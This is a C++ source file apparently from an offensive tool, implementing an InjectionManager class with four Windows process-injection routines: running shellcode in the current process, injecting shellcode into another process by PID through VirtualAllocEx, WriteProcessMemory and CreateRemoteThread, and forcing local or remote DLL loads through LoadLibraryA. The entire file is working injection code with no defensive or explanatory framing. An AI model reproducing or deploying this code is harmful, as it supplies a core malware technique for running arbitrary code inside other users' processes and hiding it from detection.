#include "InjectionManager.h"


void InjectionManager::self_inject_shellcode(const unsigned char* content, int size) {

	auto baseaddress = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (baseaddress == NULL) {
		std::cout << "VirutalAlloc failed: " << GetLastError() << std::endl;
		return;
	}


	bool res = WriteProcessMemory(GetCurrentProcess(), baseaddress, content, size, NULL);
	if (res == 0) {
		std::cout << "WriteProcessMemory failed: " << GetLastError() << std::endl;
		VirtualFree(baseaddress,0,MEM_RELEASE);
		return;
	}

	ULONG oldprotect;
	VirtualProtect(baseaddress, size, PAGE_EXECUTE_READ, &oldprotect);

	void (*funcptr)();
	funcptr = (void (*)())baseaddress;
	funcptr();

	return;


}


void InjectionManager::remote_inject_shellcode(int pid, unsigned char* content, int size) {

	HANDLE processhandle = OpenProcess(PROCESS_ALL_ACCESS,
		false, pid);

	if (processhandle == NULL) {
		std::cout << "Openprocess failed: " << GetLastError() << std::endl;
		return;
	}


	LPVOID remotebase = VirtualAllocEx(processhandle, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remotebase == NULL) {
		std::cout << "Virtualallocex failed: " << GetLastError() << std::endl;
		CloseHandle(processhandle);
		return;
	}



	bool res = WriteProcessMemory(processhandle, remotebase, content, size, NULL);
	if (res == 0) {
		std::cout << "writeprocessmemory failed: " << GetLastError() << std::endl;
		VirtualFreeEx(processhandle, remotebase, 0, MEM_RELEASE);

		CloseHandle(processhandle);
		return;
	}


	ULONG threadid = 0;
	HANDLE threadhandle = CreateRemoteThread(processhandle, NULL, 0, (LPTHREAD_START_ROUTINE)remotebase, NULL,
		0, &threadid);


	if (threadhandle == NULL) {
		std::cout << "CreateRemoteThread failed: " << std::endl;
		VirtualFreeEx(processhandle, remotebase, 0, MEM_RELEASE);
		CloseHandle(processhandle);
		return;
	}

	CloseHandle(processhandle);

	return;


}




void InjectionManager::self_inject_dll_from_file(const char* filename, int filenamelength) {

	auto baseaddress = VirtualAlloc(NULL, filenamelength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (baseaddress == NULL) {
		std::cout << "VirutalAlloc failed: " << GetLastError() << std::endl;
		return;
	}

	bool res = WriteProcessMemory(GetCurrentProcess(), baseaddress, filename, filenamelength, NULL);
	if (res == 0) {
		std::cout << "WriteProcessMemory failed: " << GetLastError() << std::endl;
		VirtualFree(baseaddress, 0, MEM_RELEASE);
		return;
	}


	HMODULE modulehandle = GetModuleHandleA("kernel32.dll\0");
	if (modulehandle == NULL) {
		std::cout << "GetModuleHandleA failed: " << GetLastError() << std::endl;
		VirtualFree(baseaddress, 0, MEM_RELEASE);
		return;
	}


	auto loadlibraryptr = GetProcAddress(modulehandle, "LoadLibraryA\0");
	if (loadlibraryptr == NULL) {
		std::cout << "GetProcAddress failed: " << GetLastError() << std::endl;
		VirtualFree(baseaddress, 0, MEM_RELEASE);
		return;
	}
	
	ULONG threadid = 0;
	HANDLE threadhandle = CreateRemoteThread(GetCurrentProcess(), 
		NULL, 0, (LPTHREAD_START_ROUTINE)loadlibraryptr, baseaddress, 0, &threadid);
	if (threadhandle == NULL) {
		std::cout << "CreateRemoteThread failed: " << GetLastError() << std::endl;
		VirtualFree(baseaddress, 0, MEM_RELEASE);
		return;
	}

	//WaitForSingleObject(threadhandle, INFINITE);

	return;

}



void InjectionManager::remote_inject_dll_from_file(int pid, const char* filename, int filenamelength) {


	HANDLE processhandle = OpenProcess(PROCESS_ALL_ACCESS,
		false, pid);

	if (processhandle == NULL) {
		std::cout << "Openprocess failed: " << GetLastError() << std::endl;
		return;
	}


	LPVOID remotebase = VirtualAllocEx(processhandle, NULL, filenamelength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remotebase == NULL) {
		std::cout << "Virtualallocex failed: " << GetLastError() << std::endl;
		CloseHandle(processhandle);
		return;
	}

	bool res = WriteProcessMemory(processhandle, remotebase, filename, filenamelength, NULL);
	if (res == 0) {
		std::cout << "WriteProcessMemory failed: " << GetLastError() << std::endl;
		VirtualFreeEx(processhandle, remotebase, 0, MEM_RELEASE);
		CloseHandle(processhandle);
		return;
	}


	HMODULE modulehandle = GetModuleHandleA("kernel32.dll\0");
	if (modulehandle == NULL) {
		std::cout << "GetModuleHandleA failed: " << GetLastError() << std::endl;
		VirtualFreeEx(processhandle, remotebase, 0, MEM_RELEASE);
		CloseHandle(processhandle);
		return;
	}


	auto loadlibraryptr = GetProcAddress(modulehandle, "LoadLibraryA\0");
	if (loadlibraryptr == NULL) {
		std::cout << "GetProcAddress failed: " << GetLastError() << std::endl;
		VirtualFreeEx(processhandle,remotebase, 0, MEM_RELEASE);
		CloseHandle(processhandle);
		return;
	}

	ULONG threadid = 0;
	HANDLE threadhandle = CreateRemoteThread(processhandle,
		NULL, 0, (LPTHREAD_START_ROUTINE)loadlibraryptr, remotebase, 0, &threadid);
	if (threadhandle == NULL) {
		std::cout << "CreateRemoteThread failed: " << GetLastError() << std::endl;
		VirtualFreeEx(processhandle, remotebase, 0, MEM_RELEASE);
		CloseHandle(processhandle);
		return;
	}

	//WaitForSingleObject(threadhandle, INFINITE);

	return;

}


